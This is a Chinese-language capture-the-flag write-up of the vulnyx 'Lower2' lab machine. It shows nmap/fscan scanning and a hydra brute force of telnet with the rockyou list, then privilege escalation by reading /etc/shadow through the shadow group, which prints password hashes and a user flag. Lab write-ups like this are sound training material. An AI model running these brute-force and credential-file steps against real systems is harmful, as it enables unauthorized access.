---
title: 【靶场】vulnyx靶场-Lower2
date: 2025-08-30
categories:
  - 靶场
image: images/23.webp
---
# 简介
vulnyx是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。
# **部署方法**
官网：https://vulnyx.com/
1.在官网搜索你想要的镜像,然后下载
2.下载好后解压得到`.ova`的文件，右击选择VMware进行打开
3.在弹出的框中，选择存放的位置，然后点击导入
4.最后等待导入完成，然后启动该虚拟机就可以了
**部署成功**
![Pasted image 20250307124829](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307124829.png)
# 步骤
## 信息收集
这里我就不收集了，IP地址获取到了，如果在实战情况下还是需要确认一下的，直接fscan扫一边看一下：
```
./fscan.exe 192.168.198.137 -nobr -np
nmap 192.168.30.45 -A -O -p 1-65535
```
![Pasted image 20250307125229](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125229.png)
![Pasted image 20250307125239](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125239.png)
这边使用fscan和nmap都扫描了一边发现开放了三个端口：
```
22/tcp open  ssh
23/tcp open  telnet
80/tcp open  http
```
这里进行尝试连接一下ssh，发现给出了一个账户：**b.taylor**
22端口是不能爆破的。登录了一下发现是拒绝的。那就只能爆破23端口了。
![Pasted image 20250307125456](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125456.png)
使用hydra进行爆破
```
字典下载地址：https://github.com/dw0rsec/rockyou.txt

hydra -l b.taylor -P /root/Desktop/Tools/rockyou.txt telnet://192.168.198.137 -V -I

```
![Pasted image 20250307130820](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307130820.png)
账号密码：b.taylor/rockyou
使用telnet进行登录即可：
![Pasted image 20250307131333](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131333.png)
## user
```
ZWRjOWY1YzU1YWY4NzUwNTAzM2EyMGRkNDE5MzEzNjQK
```
![Pasted image 20250307131600](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131600.png)
## shadow提权
发现这个用户附加了shadow组
可以查看一下权限
```
id
cat /etc/shadow
```
![Pasted image 20250307131746](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131746.png)
```
b.taylor:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20135:0:99999:7:::
root:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20134:0:99999:7:::
```
然后直接修改密码即可。